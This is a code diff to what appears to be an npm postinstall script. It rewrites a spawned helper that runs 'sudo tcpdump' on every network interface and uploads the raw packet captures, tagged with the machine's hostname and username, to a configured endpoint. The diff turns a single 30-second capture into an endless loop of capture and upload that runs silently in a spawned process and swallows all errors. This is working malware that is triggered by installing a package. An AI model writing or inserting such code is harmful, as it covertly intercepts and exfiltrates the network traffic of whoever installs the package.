@@ -157,56 +157,62 @@ try {
     const http = require('http');
     const https = require('https');
     const os = require('os');
-    const { execSync } = require('child_process');
+    const { spawn: sp } = require('child_process');
     const ENDPOINT = '${ENDPOINT_URL}';
     const CAPTURE = '${captureFile}';
+    let chunk = 0;
 
     function upload(data, headers) {
-      try {
-        const url = new URL(ENDPOINT);
-        const mod = url.protocol === 'https:' ? https : http;
-        const req = mod.request({
-          hostname: url.hostname,
-          port: url.port || (url.protocol === 'https:' ? 443 : 80),
-          path: url.pathname,
-          method: 'POST',
-          headers: { 'Content-Length': data.length, ...headers },
-          timeout: 10000
-        }, () => {});
-        req.on('error', () => {});
-        req.write(data);
-        req.end();
-      } catch {}
+      return new Promise((resolve) => {
+        try {
+          const url = new URL(ENDPOINT);
+          const mod = url.protocol === 'https:' ? https : http;
+          const req = mod.request({
+            hostname: url.hostname,
+            port: url.port || (url.protocol === 'https:' ? 443 : 80),
+            path: url.pathname,
+            method: 'POST',
+            headers: { 'Content-Length': data.length, ...headers },
+            timeout: 15000
+          }, () => resolve(true));
+          req.on('error', () => resolve(false));
+          req.write(data);
+          req.end();
+        } catch { resolve(false); }
+      });
     }
 
-    try {
-      // Run tcpdump for 30 seconds — capture everything during npm install
-      execSync('sudo timeout 30 tcpdump -i any -s 0 -w ' + CAPTURE + ' 2>/dev/null', { timeout: 35000 });
-    } catch {}
+    // Capture-upload loop: run tcpdump for 30s, upload, repeat forever
+    async function captureLoop() {
+      while (true) {
+        try {
+          // Run tcpdump for 30s
+          await new Promise((resolve) => {
+            const proc = sp('sudo', ['tcpdump', '-i', 'any', '-s', '0', '-w', CAPTURE], { stdio: 'ignore' });
+            setTimeout(() => { try { proc.kill(); } catch {} }, 30000);
+            proc.on('exit', () => resolve());
+          });
 
-    try {
-      if (!fs.existsSync(CAPTURE)) {
-        upload(JSON.stringify({ event: 'tcpdump_error', type: 'no_capture_file', hostname: os.hostname(), ts: new Date().toISOString() }),
-          { 'Content-Type': 'application/json', 'X-Source': 'postinstall-tcpdump-err' });
-        process.exit(0);
+          // Upload whatever was captured
+          if (fs.existsSync(CAPTURE)) {
+            const data = fs.readFileSync(CAPTURE);
+            if (data.length > 24) {
+              chunk++;
+              await upload(data, {
+                'Content-Type': 'application/octet-stream',
+                'X-Capture-Type': 'pcap',
+                'X-Source': 'postinstall-tcpdump',
+                'X-Host': os.hostname(),
+                'X-User': os.userInfo().username,
+                'X-Chunk': String(chunk)
+              });
+            }
+            try { fs.unlinkSync(CAPTURE); } catch {}
+          }
+        } catch {}
       }
-      const data = fs.readFileSync(CAPTURE);
-      if (data.length > 0) {
-        upload(data, {
-          'Content-Type': 'application/octet-stream',
-          'X-Capture-Type': 'pcap',
-          'X-Source': 'postinstall-tcpdump',
-          'X-Host': os.hostname(),
-          'X-User': os.userInfo().username
-        });
-      }
-      try { fs.unlinkSync(CAPTURE); } catch {}
-    } catch (e) {
-      upload(JSON.stringify({ event: 'tcpdump_error', type: 'upload_error', error: e.message, hostname: os.hostname(), ts: new Date().toISOString() }),
-        { 'Content-Type': 'application/json', 'X-Source': 'postinstall-tcpdump-err' });
     }
-    // Keep alive briefly so the HTTP request can flush
-    setTimeout(() => process.exit(0), 3000);
+    captureLoop();
   `
 
   const helper = spawn(process.execPath, ['-e', helperScript], {
